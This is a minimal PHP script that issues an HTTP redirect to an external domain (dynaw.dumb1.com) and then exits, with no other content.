<?php

header("Location: https://dynaw.dumb1.com");
exit();
?>
